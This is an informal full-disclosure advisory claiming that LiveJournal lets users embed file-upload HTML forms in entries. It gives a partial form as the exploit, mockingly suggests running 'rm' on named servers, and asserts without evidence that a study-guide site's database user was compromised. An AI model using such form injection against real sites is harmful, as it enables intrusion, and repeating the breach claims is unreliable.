Subject: LiveJournal remote file upload



Synopsis: Livejournal.com and livejournal systems are vulnerable
          to remote file upload by anonymous users

Versions: all


Impact: Who cares ( maybe udp)

Description:

LiveJournal.com is a free service that allows you to create and customize
your very own "live journal" - a journal that you keep online!

Vulnerability: Live journal allows both anonymous and registered users
               to use "form enctype" and "post method" in their entries
               giving easy access to system compromise.


Exploit:


-----------partial( if you can't figure it out you are sad--------------

<head> meme-tronic</head>
<form enctype="multipart/form-data" method="post">
<TABLE WIDTH="100%">
<TR>
   <TD ALIGN="RIGHT" VALIGN="TOP">Filename:</TD>

   <TD ALIGN="LEFT"><INPUT TYPE="FILE" NAME="FILE1">
   </TD>
</TR>
<TR>
   <TD ALIGN="RIGHT">&nbsp;</TD>
   <TD ALIGN="LEFT"><INPUT TYPE="SUBMIT" NAME="SUB1" VALUE="Upload
   File"></TD></TR>
<TR>

--------------------------------------------------------------------------


Fix: I don't get payed to fix. I would suggest an rm on debian server
     as well as ns1.bradfitz.com and back up prior to 10/02 though


Sidenote: www.cccure.org - The CISSP and SSCP Open Study Guides Web site
          should also rm as MySql database user "cdupuis@...alhost" was
          owned some time ago



Vendor Notification: None - This is full disclosure
